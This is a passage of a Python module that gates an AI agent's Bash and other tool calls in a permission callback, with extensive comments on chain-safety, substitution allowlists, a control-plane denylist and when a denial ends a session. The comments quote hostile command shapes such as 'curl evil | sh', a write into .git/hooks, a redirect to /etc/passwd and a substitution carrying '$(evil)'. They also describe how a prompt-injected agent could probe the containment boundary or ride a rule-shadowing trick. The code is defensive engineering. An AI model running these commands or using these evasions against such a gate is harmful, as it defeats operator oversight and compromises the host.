"""can_use_tool callback builder. Port of src/permissions.ts.

Tier 1 → fast-path allow.
Relay disabled → interactive fallback (or auto-deny in non-TTY).
Otherwise → invoke external agent, retry once on transient error, map
response to SDK PermissionResult.
"""

from __future__ import annotations

import json
import logging
import os
import re
import shlex
import sys
import time
from collections.abc import Awaitable, Callable
from pathlib import Path
from typing import Any

from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny
from claude_agent_sdk.types import ToolPermissionContext

from . import audit, per_spawn, permission_events
from .guardrails import SessionGuardrails
from .heartbeat import emit_heartbeat
from .policy import Policy, evaluate, load_policy
from .tier1 import (
    _split_compound_command,
    is_safe_bash_command,
    is_tier1_auto_approve,
    is_tier3_dangerous,
    is_tier3_dangerous_for_lethality,
    is_within_project,
)
from .transport import invoke_command
from .types import (
    PilotConfig,
    PilotEvent,
    PilotResponse,
    PilotResponseAllow,
    PilotResponseAnswer,
    PilotResponseDeny,
    TransportError,
)
from .ui import (
    log_denied,
    log_escalate,
    log_fallback,
    log_policy_allow,
    log_policy_deny,
    log_policy_deny_with_notify,
    log_question,
    log_question_escalate,
    log_relay_recv,
    log_relay_send,
    log_retry,
    log_tool,
    log_tool_request,
)

_policy_logger = logging.getLogger(__name__)

PermissionResult = PermissionResultAllow | PermissionResultDeny
CanUseTool = Callable[
    [str, dict[str, Any], ToolPermissionContext],
    Awaitable[PermissionResult],
]


# ── Per-spawn permission-policy mode (mika#1708) ─────────────────────────────
#
# ``MIKA_PERMISSION_POLICY_MODE`` selects which Bash evaluator fires:
# - ``classic`` (default): existing syntactic tier1 + policy.yaml stack.
# - ``per_spawn``: new bashlex-decomposing per-binary evaluator in
#   :mod:`claude_pilot.per_spawn`.
#
# The switch is Bash-scoped. Non-Bash tools always follow the classic
# tier1 / policy path — per_spawn only replaces the shell-parsing half.
#
# Mika-side ships its allow/deny CONTENTS via a plugin module referenced
# through ``MIKA_PERMISSION_POLICY_MODULE=package.module:attribute``. This
# module ships an empty default policy so the OSS release carries no
# Mika-specific safety functions (SSC boundary discipline).
#
# Migration path (per architect-ratified spec):
# - Phase 1: opt-in. Default ``classic``. Operators flip a canary via env
#   var. Audit events (:mod:`claude_pilot.audit`) let mika-side monitor.
# - Phase 2: flip default after N dispatches + zero blocks.
# - Phase 3: retire ``tier1.py`` shell paths.

PERM_MODE_CLASSIC = "classic"
PERM_MODE_PER_SPAWN = "per_spawn"
_VALID_PERM_MODES = frozenset({PERM_MODE_CLASSIC, PERM_MODE_PER_SPAWN})


def _resolve_perm_mode() -> str:
    """Read ``MIKA_PERMISSION_POLICY_MODE`` env var, defaulting to classic.

    Unknown values fall back to ``classic`` (fail-safe: never accidentally
    engage the new evaluator due to a typo).
    """
    raw = os.environ.get("MIKA_PERMISSION_POLICY_MODE", "").strip().lower()
    if raw in _VALID_PERM_MODES:
        return raw
    return PERM_MODE_CLASSIC


def _load_per_spawn_policy() -> dict[str, per_spawn.PolicyFn]:
    """Load the per-spawn policy registry.

    Reads ``MIKA_PERMISSION_POLICY_MODULE`` — a ``package.module:attribute``
    reference. If unset, returns the empty :data:`per_spawn.DEFAULT_POLICY`.
    On load error, logs to stderr and falls back to empty (fail-safe: every
    spawn will reject, which drops through to classic tier2 / relay rather
    than silently allowing anything).
    """
    module_ref = os.environ.get("MIKA_PERMISSION_POLICY_MODULE", "").strip()
    if not module_ref:
        return per_spawn.DEFAULT_POLICY
    try:
        return per_spawn.load_policy_from_module(module_ref)
    except Exception as e:
        _policy_logger.warning(
            "MIKA_PERMISSION_POLICY_MODULE=%r failed to load: %s: %s. "
            "Falling back to empty policy.",
            module_ref, type(e).__name__, e,
        )
        return per_spawn.DEFAULT_POLICY


# ── Chained-danger guard over policy Bash allow (claude-pilot#25) ────────────
#
# policy.evaluate() matches a single regex against the WHOLE command string
# (policy.py first-match-wins) — it does NOT compound-split or danger-scan.
# Tier1, by contrast, is safe precisely because it splits a compound and
# requires EVERY sub-command to be on an allow-list (tier1.is_safe_bash_command
# → _is_safe_sub_command). A policy allow rule like ``^mkdir`` matches the whole
# string ``mkdir x && curl evil | sh`` and the dangerous tail rides along.
# Re-applying only a *denylist* (is_tier3_dangerous) is insufficient: curl|sh,
# ./payload, pip/npm/python install, chmod, dd, cp-of-secrets, node -e … are not
# on that denylist. So this guard mirrors tier1's ALLOW-LIST model over the
# chain: a policy-allowed Bash command is honored only when every compound
# segment is independently (a) tier1-safe, or (b) itself a clean policy allow.
#
# Substitution: ``mkdir "$(curl evil)"`` — forbidden outright via the literal
# markers below. DELIBERATELY stricter than tier1's quote-aware
# contains_unquoted_metacharacter (which ignores substitution inside double
# quotes, mirroring the Rust pre-classifier — mika#944/#946); the new dev-pilot
# rules are write-capable, so a policy-allowed command never needs substitution.
#
# Heredoc / here-string: we do NOT parse bash heredoc grammar with regexes —
# that is a lexer the line-based approximations keep losing to (a ``<<<`` here-
# string desync once let a chained tail ride through). Structural rule instead:
# ``<<<`` (here-string) is vetoed outright; ``<<`` (heredoc) is admitted only for
# the single sanctioned ``cat > /tmp`` rule, and only when nothing executable is
# chained after the heredoc terminator. Every other ``<<`` command is vetoed.
#
# Redirect (``>``): the wholesale tier3 ban on ``>`` is lifted for exactly ONE
# more sanctioned shape besides the /tmp heredoc — ``git show <SHA>:<path> >
# <relative-path>`` (cpp#35), recognized by honoring the ``bash-git-show-redirect``
# policy rule_id after the universal vetoes above have run. See the inline
# comment at that branch for the safety argument.

# Closed-world allowlist of whole command-substitution tokens that are known
# safe to embed in a policy-allowed command (cpp#34, mika-arch session
# 783d4a04). Each entry is matched by EXACT LITERAL STRING EQUALITY of the entire
# ``$(...)`` token — never by lexing or regex on the inner content. That whole-
# token literal match is the load-bearing invariant: bash either substitutes this
# exact byte sequence or it does not, so the gate's notion of the token cannot
# diverge from bash's (no parser differential). Each enumerated inner command is
# strictly read-only git plumbing, emits a single short identifier on stdout, and
# itself contains no nested ``$(``, backtick, redirect, or pipe — the properties
# that make it safe to treat as an opaque, side-effect-free literal.
#
# CLOSED WORLD: this list is exhaustive on purpose. A substitution that is merely
# read-only but not enumerated here (e.g. ``$(git status)``) is still vetoed.
# Over-blocking is the correct posture. Adding an entry is a separate, evidence-
# gated follow-up ticket — never an inline edit — and each candidate must satisfy
# the per-entry invariants above. Backtick and ``$'`` forms are NOT allowlistable.
_SUBSTITUTION_ALLOWLIST = (
    "$(git branch --show-current)",
    "$(git rev-parse --abbrev-ref HEAD)",
    "$(git rev-parse HEAD)",
    "$(git rev-parse --short HEAD)",
    # `merge-base` prints the best common ancestor SHA on stdout — same class as
    # the rev-parse tokens above (short identifier output, no side effects, no
    # nested `$(`, backtick, redirect, or pipe). The main / origin/main variants
    # are the base-drift detection idiom used by dispatch-lib and dev-groom
    # (`BASE=$(git merge-base main HEAD); git diff --name-only $BASE HEAD`).
    # 18-incident policy:deny class 2026-07-26 → 2026-07-27 (mika#1852/#1849
    # groom/pilot halted on this shape). Coupled pair with the `merge-base`
    # addition to `SAFE_GIT_SUBCOMMANDS` in tier1.py — both must land together
    # to unblock the compound and its standalone form.
    "$(git merge-base main HEAD)",
    "$(git merge-base origin/main HEAD)",
    # cpp#95: reverse argument order — `git merge-base` is commutative, so the
    # HEAD-first variants are the same read-only-plumbing-emits-short-SHA safety
    # class as the main-first variants above. mika-dev pilots write both orders
    # organically: `BASE=$(git merge-base HEAD main) || BASE="main"`. Adding both
    # orderings drops one of the three sampled cpp#95 prod-failure classes
    # (mika-db tasks id `27ea7dc4-5dfb-40cf-bc44-85970cd28e72`, mika#1824).
    #
    # cpp#98: 2>/dev/null variants for merge-base — the branch-drift detection
    # idiom uses stderr silencing when HEAD/base are unresolvable (fresh clone,
    # detached HEAD). Invariant expansion RATIFIED: `2>/dev/null` is the ONE
    # accepted redirect inside `$(...)` because:
    #   1. `2>` targets stderr only (never stdout — the substituted value)
    #   2. `/dev/null` is a literal inert bytes sink (no filesystem write to
    #      attacker-chosen path — `/dev/null` is a kernel-owned device with no
    #      state, no observability channel, no side effect)
    #   3. Combined: the sole effect of `2>/dev/null` is dropping stderr; the
    #      command's stdout capture (which the substitution embeds) is unchanged
    # Founding evidence: mika-dev pilot sessions 57f7c3fb + 53917b4e halted on
    # `BASE=$(git merge-base HEAD main 2>/dev/null) || BASE=main; ...` shape
    # (2026-07-29 post cpp#96 deploy). All 4 orderings (main/HEAD, origin/main,
    # both directions) added to match the commutative git-merge-base semantics.
    "$(git merge-base HEAD main)",
    "$(git merge-base HEAD origin/main)",
    "$(git merge-base HEAD main 2>/dev/null)",
    "$(git merge-base HEAD origin/main 2>/dev/null)",
    "$(git merge-base main HEAD 2>/dev/null)",
    "$(git merge-base origin/main HEAD 2>/dev/null)",
    # cpp#95: `$(date +%F)` and `$(date +%Y-%m-%d)`. `date` is a POSIX read-only
    # utility with no filesystem or ref-mutation side effects. `+%F` and
    # `+%Y-%m-%d` are literal format specifiers producing a fixed-length
    # YYYY-MM-DD string on stdout — the same short-identifier-output class as
    # the git-plumbing tokens above (no nested `$(`, backtick, redirect, or
    # pipe in the token). Used by mika-dev pilots for date-templated filenames
    # (`docs/plans/$(date +%F)-...`, `grep "$(date +%F)" ...`). Drops the second
    # sampled cpp#95 prod-failure class (mika-db tasks id
    # `5c3c4622-6d9f-43be-9c1d-07a9b72e4478`, mika#1823) and the third
    # (`b22e4b7a-3e01-410f-a18b-92c9a0fdf9ff`, mika#1712).
    "$(date +%F)",
    "$(date +%Y-%m-%d)",
    # cpp#95: `$(pwd)`. `pwd` is a POSIX shell builtin (also `/usr/bin/pwd` as
    # a distinct binary — this literal invokes whichever bash resolves) that
    # prints the current working directory on stdout — a bounded short path
    # string, no side effects. Same class as the tokens above (no nested `$(`,
    # backtick, redirect, or pipe in the token). Used by mika-dev pilots for
    # relative-to-absolute path composition (`cd "$(pwd)/subdir"`,
    # `cat "$(pwd)/manifest.json"`). Preemptive addition alongside the two
    # `date` and two `merge-base HEAD-first` tokens — same evidence class
    # (compound-bash tier1 gap 2026-07-26 → 2026-07-28 rupture-D storm, 12
    # rescue-drafts single-day peak). See cpp#95 body for full pattern
    # analysis.
    "$(pwd)",
)

# Inert placeholder a redacted substitution collapses to. Identifier-shaped with
# no shell metacharacters, so it can neither introduce a new chain break / marker
# nor desync the segment splitter. As a standalone segment it matches no tier1
# allow-list entry and no policy allow rule, so ``git status && $(git branch
# --show-current)`` correctly vetoes once redacted to ``git status && _SUB_``.
_SUBSTITUTION_PLACEHOLDER = "_SUB_"

# bash 5.3 K-style command substitution opener (cpp#37). ``${ command; }`` and
# ``${| command; }`` run ``command`` and substitute its stdout — equivalent
# injection power to ``$(...)`` — and are NOT allowlistable (same class as
# backtick / ``$'``). This matches the OPENING TOKEN SHAPE only, never the body:
# bash 5.3 distinguishes a funsub from ``${name}`` parameter expansion purely by
# the byte after ``${`` — funsub requires whitespace (space / tab / newline) or
# ``|``, whereas parameter expansion (``${HOME}``, ``${#arr[@]}``, ``${VAR:-x}``)
# requires an identifier or special-parameter char. So ``\$\{`` followed by
# ``[\s|]`` is an unambiguous funsub marker; it can never collide with a legitimate
# ``${name}``. ``\s`` is a superset of bash's blank set (it also covers CR/FF/VT) —
# over-matching here only ever vetoes (the safe direction) and cannot block a real
# parameter expansion, which never has whitespace after ``${``. No funsub
# allowlist exists; like ``$(``, any future safe-funsub allowance is a separate
# evidence-gated ticket (cpp#34 closed-world discipline, mika-arch 783d4a04).
_FUNSUB_OPENER_RE = re.compile(r"\$\{[\s|]")


def _redact_allowlisted_substitutions(command: str) -> str | None:
    """Redact allowlisted ``$(...)`` tokens, or signal an unrecognized one.

    Replaces every occurrence of each allowlisted token (exact substring, no
    lexing) with ``_SUB_``. Returns the redacted command only when **no** ``$(``
    survives — meaning every command substitution present was on the closed-world
    allowlist. Returns ``None`` when an unrecognized ``$(`` remains (nested,
    off-allowlist, whitespace variant, or mixed allowlisted + evil), so the caller
    vetoes. The caller handles backtick / ``$'`` forms before reaching here — this
    is keyed on ``$(`` only.
    """
    redacted = command
    for token in _SUBSTITUTION_ALLOWLIST:
        redacted = redacted.replace(token, _SUBSTITUTION_PLACEHOLDER)
    if "$(" in redacted:
        return None
    return redacted


# A bare ``&`` used as a backgrounding separator (not ``&&``, not an fd-dup like
# ``2>&1`` / ``>&2`` / ``&>``). Splitting on it is unsafe (would break fd-dups),
# so we reject any command that contains one — a policy-allowed dev command
# never backgrounds.
_BARE_AMP_RE = re.compile(r"(?<![>&\d])&(?!&|>)")

# The ONLY sanctioned heredoc shape, validated as one whole opener line. The
# delimiter is HARD-CODED to ``EOF`` on purpose: four prior review passes each
# found a desync from trying to *lex* bash's heredoc delimiter with a regex
# (``<<<`` here-strings, trailing commands, leading chains, and ``<<EOF.``
# non-word delimiter suffixes). Fixing the delimiter to a literal ``EOF`` means
# the classifier's close-point cannot diverge from bash's — there is no
# delimiter to mis-parse. The opener must be the entire first line (``^…$``):
# ``cat`` redirecting to a single ``/tmp/<token>`` path (no spaces, no ``..``),
# then ``<<`` / ``<<-`` and a QUOTED delimiter — exactly ``'EOF'`` or ``"EOF"``.
# Anything chained or substituted before ``<<`` breaks the full-line match → veto.
#
# The delimiter MUST be quoted (cpp#47). The close-point fix above made the
# *terminator* safe, but body expansion is a separate axis: with a bare unquoted
# ``<<EOF`` bash expands the heredoc body, so ``$(…)`` / backtick / ``${ …; }``
# funsub in the body EXECUTE during heredoc expansion (verified on bash 5.3.9) —
# while this gate, returning early before the substitution-marker veto, would
# auto-approve the command. Quoting the delimiter (``'EOF'`` or ``"EOF"``; either
# form disables expansion, verified on bash 5.3.9) makes the body provably inert,
# restoring the "inert /tmp file write" guarantee this exception was designed for
# (cpp#34/#35). Writing literal ``$(…)`` *content* to a file requires a quoted
# delimiter anyway, so no legitimate use is lost. See the §2 heredoc lesson in
# docs/solutions/security-issues/command-string-policy-allow-rules-are-compound-unsafe.md.
_SANCTIONED_HEREDOC_OPENER_RE = re.compile(
    r"""^cat\s+>\s+/tmp/(?!.*\.\.)[\w./-]+\s+<<-?\s*(?:'EOF'|"EOF")\s*$"""
)
_HEREDOC_TERMINATOR = "EOF"


def _is_sanctioned_pure_heredoc(command: str) -> bool:
    """True only for ``cat > /tmp/<token> <<'EOF'`` … ``EOF`` with no trailing command.

    The opener is matched as a whole line so nothing rides before ``<<``, and the
    delimiter must be QUOTED (``'EOF'`` / ``"EOF"``) so bash performs no expansion
    on the body — an unquoted ``<<EOF`` would expand (execute) substitutions in the
    body, so it is not sanctioned (cpp#47). The body closes on a bare ``EOF`` line
    (the closing delimiter is always unquoted in bash, regardless of opener
    quoting, so the close-point is fixed and matches bash); nothing executable may
    follow the terminator. Conservative on any ambiguity (unterminated, trailing
    non-blank) → False so the caller vetoes.
    """
    lines = command.split("\n")
    if not _SANCTIONED_HEREDOC_OPENER_RE.match(lines[0]):
        return False
    j = 1
    while j < len(lines) and lines[j].strip() != _HEREDOC_TERMINATOR:
        j += 1
    if j >= len(lines):
        return False  # unterminated heredoc
    return all(not lines[k].strip() for k in range(j + 1, len(lines)))


def _bash_allow_is_chain_safe(
    policy: Policy, tool_name: str, tool_input: dict[str, Any]
) -> bool:
    """Whether a policy ``allow`` decision is safe to honor.

    ``True`` for every non-Bash tool. For Bash, ``True`` only when every
    compound segment is independently tier1-safe or a clean (non-tier3) policy
    allow — so a dangerous command chained onto an allowed prefix is vetoed.
    """
    if tool_name != "Bash":
        return True
    command = tool_input.get("command", "")
    if not isinstance(command, str):
        return False

    if "<<<" in command:  # here-string: never parseable as inert, always veto
        return False
    if "<<" in command:
        # The ONLY ``<<`` admitted is the sanctioned, fully-anchored /tmp
        # cat-heredoc (delimiter fixed to EOF). Everything else routes to relay.
        return _is_sanctioned_pure_heredoc(command)

    # Command substitution. Backtick / ``$'`` / bash 5.3 K-style funsub (``${ … }``)
    # forms are never allowlistable → veto outright. For ``$(`` forms, admit only
    # the closed-world allowlist: redact each allowlisted whole-token to an inert
    # ``_SUB_`` placeholder, then let the per-segment chain check below run on the
    # redacted command. We do NOT short-circuit ``return True`` — the redacted
    # command still needs full chain-safety (e.g. ``git status && $(git branch
    # --show-current)`` becomes ``git status && _SUB_``, whose ``_SUB_`` segment
    # fails the segment check). The funsub veto is keyed on the opener token only
    # (``_FUNSUB_OPENER_RE``); it leaves ``${name}`` parameter expansion untouched.
    if "`" in command or "$'" in command or _FUNSUB_OPENER_RE.search(command):
        return False
    if "$(" in command:
        redacted = _redact_allowlisted_substitutions(command)
        if redacted is None:
            return False  # an unrecognized ``$(`` substitution remains
        command = redacted
    if _BARE_AMP_RE.search(command):
        return False

    # Sanctioned `git show <SHA>:<path> > <relative-path>` (cpp#35). The wholesale
    # `>` veto below (a single segment with a redirect is never tier1-safe and is
    # always tier3-dangerous) otherwise blocks the dispatch-lib plan-import flow.
    # The `bash-git-show-redirect` policy rule encodes the FULL safe shape in one
    # anchored regex. NOTE the source is NOT immutable: the `[a-f0-9]+` shape
    # matches a full SHA, an abbreviated SHA, OR a hex-named branch/tag, and
    # `git show deadbeef:f` resolves `deadbeef` as a mutable, force-pushable
    # branch (git prefers the ref; cpp#43). Safety therefore rests SOLELY on the
    # literal worktree-relative target (rejects absolute/`~`/literal-`..`/shell-
    # expansion), never on source-immutability — so honoring its rule_id here is
    # the same "sanctioned exception to a wholesale veto" pattern as
    # `_is_sanctioned_pure_heredoc` above. This MUST come AFTER
    # the here-string / heredoc / substitution-marker / bare-`&` vetoes: those run
    # first, so a substitution-laden source (`git show abc:$(evil) > x`) is
    # rejected before reaching here. The rule_id coupling fails CLOSED — if the
    # YAML rule is renamed or dropped, this never fires and the command routes to
    # the normal veto (deny), the safe direction.
    #
    # RESIDUAL (accepted, mika-arch session fe891012): the rule's static target
    # check rejects literal `../` but CANNOT detect SYMLINK traversal — a relative
    # target through a committed symlink (`> esc/passwd`, esc -> ../OUTSIDE) writes
    # outside the worktree. Same symlink-blind residual the deployed `bash-cp-mv`/
    # `bash-mkdir` rules already carry (static policy is a pre-exec shape filter,
    # not a runtime sandbox). Worktree containment is a runtime concern (cf. the
    # Write tool's `is_within_project`); closing it policy-wide is tracked in cpp#38.
    pd = evaluate(policy, tool_name, tool_input)
    if pd.decision == "allow" and pd.rule_id == "bash-git-show-redirect":
        return True

    # `bash-for-loop-safe-body` (cpp#92) — sanctioned exception to chain-safe's
    # segment split, mirroring `bash-git-show-redirect`. The rule's YAML regex
    # constrains the ENTIRE command shape (anchored `^for … done$`, enumerated
    # body command, arg charset excludes `;`/`|`/`&`/backtick/`$`/`>`, in-list
    # charset excludes `$`/backtick), so no chained danger can ride any layer
    # of the compound. Splitting on the internal `;` between `in`/`do`/`done`
    # would incorrectly veto — the split segments (`for x in y`, `do echo`,
    # `done`) are each individually not tier1-safe and not policy-allow, so
    # chain-safe would deny a shape the tight rule already provably vetted.
    # The rule_id coupling fails CLOSED — if the YAML rule is renamed or
    # dropped, this never fires and the command routes through the broader
    # `bash-for-loop-orientation` rule where chain-safe DOES split (typically
    # denying — which is the pre-cpp#92 60%-throughput-loss failure mode this
    # exception is designed to close). See cpp#92 for the founding evidence
    # (mika-platform PUSH FORT diagnostic 2026-07-28, rupture A).
    if pd.decision == "allow" and pd.rule_id == "bash-for-loop-safe-body":
        return True

    # `bash-explore-script-fallback` (cpp#100) — sanctioned exception mirroring
    # `bash-git-show-redirect` (cpp#35) and `bash-for-loop-safe-body` (cpp#92).
    # The rule's YAML pattern anchors the ENTIRE compound: `^cat <path>
    # [2>/dev/null] [| head -N] ; echo "<literal>" ; ./scripts/<name>
    # [<quoted-args>] [2>/dev/null] [|| echo "<literal>"]$`, charset-restricted
    # quoted args exclude chain metachars (`;`/`|`/`&`/backtick/`$`/`<`/`>`/`\`),
    # so no dangerous tail can ride any layer of the compound. Chain-safe honors
    # the rule_id without splitting on `;`/`||`.
    # Founding evidence: mika-spirit task 1a4244b6 halted 2026-08-03T08:02:14Z
    # (5-day mika-platform loop stall, groom-stage substrate block).
    # The rule_id coupling fails CLOSED — if the YAML rule is renamed or
    # dropped, this never fires and dispatch reverts to the compound-split
    # veto (safe direction).
    if pd.decision == "allow" and pd.rule_id == "bash-explore-script-fallback":
        return True

    segments = _split_compound_command(command)
    if not segments:
        return False
    for seg in segments:
        if is_safe_bash_command(seg):
            continue
        pd = evaluate(policy, tool_name, {"command": seg})
        if pd.decision == "allow" and not is_tier3_dangerous(seg):
            continue
        return False
    return True


# ── Denial lethality (cpp#128) ────────────────────────────────────────────────
#
# A policy refusal has two independent properties: the DECISION (the command is
# refused and never executed) and the LETHALITY (whether the SDK agent loop is
# aborted along with it). cpp#20 joint 2 fused them: every denial returned
# `interrupt=True`, so any refusal killed the session.
#
# Measured on the 60 most recent pilot sessions (cpp#128 body,
# `/var/log/claude-pilot/*.stderr`): 11 sessions carried a `[policy:deny]`, 11
# ended in `error_during_execution`, and they were the SAME 11 — the tool-call
# counts of the eleven were 22, 5, 5, 4, 4, 3, 3, 2, 2, 2, 1, with no zero among
# them. Every session that did any work was killed by this path. The refused
# shapes were not dangerous commands but the ordinary probe idiom
# `echo "label"; command`, each tripping a different rule id.
#
# This helper splits the two properties back apart. The decision is untouched:
# nothing below turns a deny into an allow, and no rule is widened. Only the
# lethality is narrowed, to the two classes that genuinely warrant ending the
# run (cpp#128 option B):
#
#   * `_destination_veto_reason` — worktree containment / control-plane
#     denylist (cpp#38, cpp#42). Hard-coded terminal at its own call site, and
#     ALSO consulted by this helper so the containment boundary is terminal on
#     every denial route, not only on the one that happened to match a
#     write-capable allow rule. Without that second check the boundary degrades
#     from a one-shot tripwire into a probing oracle: `mkdir -p /outside/x`
#     matches `bash-mkdir`, reaches the veto at its own call site and halts,
#     while `echo "go"; mkdir -p /outside/x` fails chain-safety, never reaches
#     that call site, and would otherwise let a prompt-injected pilot keep
#     guessing spellings once per turn for the rest of its budget.
#     Coverage is exactly `_segment_write_kind`'s: `mkdir`, `cp`/`mv`, and
#     `git show >`. A write verb it does not classify (`touch`, `tee`, ...) is
#     still REFUSED — nothing is written — but non-terminally. Closing that gap
#     means teaching `_segment_write_kind` more verbs, which is its own change.
#     `_destination_veto_reason` itself carries one narrow, named exception to
#     its containment check — a `mkdir` under `/tmp` (cpp#143, see the block
#     above that function) — so this bullet's "matches `bash-mkdir`, halts" is
#     no longer true for `/tmp` specifically; it is unchanged for every other
#     out-of-worktree target.
#   * tier3-dangerous Bash — the codebase's own name for a genuinely dangerous
#     command. `is_tier3_dangerous` is a whole-string `re.search`, so a
#     dangerous tail chained onto an allowed prefix (`mkdir x && rm -rf /tmp/y`)
#     is still caught here and still terminal. cpp#130 narrows ONLY the lethality
#     arm of this class: the gate uses `is_tier3_dangerous_for_lethality`, which
#     drops a redirect to the inert /dev/null sink (`grep … >/dev/null`) before
#     the pattern check. Such a command stays REFUSED (the tier1 path still calls
#     the unnarrowed `is_tier3_dangerous`) but non-terminally — nothing is
#     written, so it is the two-character life-or-death gap #130 describes, not a
#     dangerous write. A real write target (`> /etc/passwd`) or a dangerous verb
#     chained alongside the /dev/null redirect is untouched and stays terminal.
#
# Both are Bash-shaped notions. A denial for any other tool is non-terminal.
#
# Everything else comes back to the model as a `tool_result` error it can adapt
# to — the open class `tier1.py`'s prevention hint named ("that class closes
# only when cpp#20 joint 2's contract is revised to distinguish adaptation from
# fabrication", mika#1410).
#
# NOT corroboration: `policies/permissions.yaml:147` claims broader shapes
# "route to relay". They do not, and did not before this change either — the
# relay block below is reachable only under MIKA_PILOT_POLICY_DISABLED=1. That
# comment is wrong in both worlds; it is named here so the next reader does not
# mistake it for a description of this behavior.
#
# The counter-reason recorded at cpp#20 joint 2 — that a non-terminal denial
# "surfaces the denial as a tool_result error the LLM can fabricate around" —
# does not depend on `interrupt=True`. A refusal loop IS bounded, and ends
# honestly with a terminal `ResultJson`. But be precise about what bounds it,
# because three of the four session guardrails structurally cannot:
#
#   * `maxTurns=200` (`types.py:42`) — the real bound. SDK-native; ends the run
#     with `error_max_turns`, a genuine ResultMessage.
#   * `stallThreshold=5` — does NOT fire. `guardrails.py` resets
#     `_consecutive_stall_turns = 0` on any turn with `has_tool_use`, and a
#     refused call is still a tool use.
#   * `emptyResponseThreshold=5` — same reset; a refusal loop produces content.
#   * `idleTimeoutMs=300_000` — rearmed by turn boundaries and content-bearing
#     stream events; a busy loop keeps it alive.
#
# The first three detect a SILENT or degenerate session, not a busy-but-fruitless
# one. `maxTurns` carries this alone, and `--no-guardrails` / `--stall-threshold 0`
# (`cli.py`) can zero the other three but not it. A pilot that adapts to a
# refusal is not a dishonest pilot; a pilot that never stops would be, and
# `maxTurns` is what actually stands in the way.


def _denial_is_terminal(tool_name: str, tool_input: dict[str, Any], cwd: str) -> bool:
    """Whether a policy denial must also abort the SDK agent loop (cpp#128).

    ``False`` — the refusal is surfaced to the model as a ``tool_result`` error
    and the run continues — for every tool other than Bash, and for a Bash
    command that is neither tier3-dangerous nor a containment escape.

    ``True`` for a tier3-dangerous Bash command, for a Bash command whose write
    destination escapes ``cwd`` or lands on the control plane, and for a Bash
    request that carries no parseable ``command`` at all — a missing key and a
    non-string value are the same condition and must classify the same way, so
    both fail closed. An explicitly EMPTY string is a parseable command and is
    not dangerous, so it stays non-terminal.

    ``_destination_veto_reason`` is defined below; it is total (``None`` for a
    non-string or empty command, segments classified structurally by their
    leading command word), so it is safe to run on an already-refused command.
    """
    if tool_name != "Bash":
        return False
    command = tool_input.get("command")
    if not isinstance(command, str):
        return True
    # cpp#130: the LETHALITY gate uses the /dev/null-narrowed classifier. A
    # command whose sole tier3 trigger is a redirect to the inert /dev/null sink
    # (`grep … >/dev/null`) stays REFUSED via is_tier3_dangerous on the tier1
    # path, but is not on its own fatal here — nothing is written. A genuinely
    # dangerous command that also redirects to /dev/null stays fatal.
    if is_tier3_dangerous_for_lethality(command):
        return True
    return _destination_veto_reason(command, cwd) is not None


# ── Destination validation for write-capable structural rules (cpp#38, cpp#42) ─
#
# `_bash_allow_is_chain_safe` (above) proves a command is shape-safe and that no
# dangerous tail rides an allowed prefix. It is still a PRE-EXEC STRING FILTER:
# it cannot see the filesystem, so it cannot tell that a relative redirect/copy/
# mkdir target traverses a committed symlink out of the worktree (cpp#38), nor
# that an in-worktree target lands on the agent's own control plane (cpp#42).
#
# Those two checks are runtime-adjacent — they need the worktree root (`cwd`),
# which the policy guard does not carry. They run in the handler, at the single
# point where a Bash policy `allow` is honored (see `create_permission_handler`),
# AFTER chain-safety passes. Every write-capable structural rule reaches that
# point and nowhere else: `cp`/`mv`/`mkdir` are absent from tier1's
# `SAFE_SHELL_COMMANDS`, and `git show … > dest` is rejected by tier1's
# metacharacter/danger scan — so all three can only be approved through the
# Tier-2 policy path. One chokepoint, no per-rule duplication.

# Write-capability is classified STRUCTURALLY, by the segment's leading command
# word — NEVER by the policy `rule_id`. `policy.evaluate` is first-match-wins
# `re.search`, so a benign earlier rule shadows the write rule while bash still
# executes the write: `bash-grep`'s `\sgrep\s` matches ` grep ` ANYWHERE, so
# `cp "payload grep x" .git/hooks/post-checkout` evaluates to `rule_id=bash-grep`
# — a rule-id gate would skip it and miss the control-plane write. The whole
# command was already established as allow + chain-safe by the handler; the
# literal command shape, not the matched rule, is the source of truth for what
# bash writes (cpp#42 adversarial review).
_LEADING_CMD_RE = re.compile(r"^\s*(\S+)")
_GIT_SHOW_RE = re.compile(r"^\s*git\s+show\b")

# `git show <SHA>:<src> > <dest>` — the redirect target is the write destination.
# Mirrors the anchored `bash-git-show-redirect` YAML pattern's target group; its
# `[\w./-]+` class excludes spaces/quotes, so a quoted/spaced redirect target
# can't match the rule at all (it would be denied) — regex-on-raw-segment is safe
# here, unlike cp/mv/mkdir whose operands are shell-quoted (tokenized via shlex).
_GIT_SHOW_REDIRECT_DEST_RE = re.compile(r">\s*([\w./-]+)\s*$")

# A `cp`/`mv` short-flag cluster whose last (arg-taking) flag is `-t`
# (target-directory): `-t`, `-rt`, `-vt`, `-rpt`, … The NEXT token is the target
# directory. The attached form (`-tDIR`) is NOT matched here — it has no separate
# next token, so it falls through to the fail-closed `None` (safe over-deny).
_CP_MV_TARGET_FLAG_RE = re.compile(r"-[A-Za-z]*t")

# Control-plane denylist (cpp#42): in-worktree destinations that, if written,
# compromise the surface that constrains the agent. Matched against the canonical
# worktree-RELATIVE resolved path (so a symlink that lands inside `.git/` etc. is
# still caught). Each entry is anchored with `(/|$)` so it matches BOTH the bare
# directory/file (`cp source .git`, `cp -t .claude x` — which write the gitdir
# pointer / into the dir) AND any path beneath it, while a sibling like top-level
# `.gitignore` still does NOT match (the char after `.git` is `i`, not `/`/end).
# Each entry carries its blast-radius rationale; broadening is evidence-gated.
_CONTROL_PLANE_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"^\.git(/|$)"),                   # hooks/config/gitdir — execute on next checkout
    re.compile(r"^\.github/workflows(/|$)"),      # run in CI with broad org-token access
    re.compile(r"^\.claude(/|$)"),                # agent's own slash commands (self-modify)
    re.compile(r"^skills/bundled(/|$)"),          # bundled skills every pilot session trusts
    re.compile(r"^crates/mika-agent/src/well_known_agents\.rs$"),  # mika agent identities
    re.compile(r"^\.mika(/|$)"),                  # ~/.mika runtime config
)


def _segment_write_kind(seg: str) -> str | None:
    """Classify a command segment by the file-write it performs, from its leading
    command word only (rule-order-independent). Returns the write-kind key, or
    ``None`` for a non-write segment."""
    m = _LEADING_CMD_RE.match(seg)
    if not m:
        return None
    cmd = m.group(1)
    if cmd in ("cp", "mv"):
        return "bash-cp-mv"
    if cmd == "mkdir":
        return "bash-mkdir"
    if cmd == "git" and _GIT_SHOW_RE.match(seg) and ">" in seg:
        return "bash-git-show-redirect"
    return None


def _shlex_operands(seg: str) -> list[str] | None:
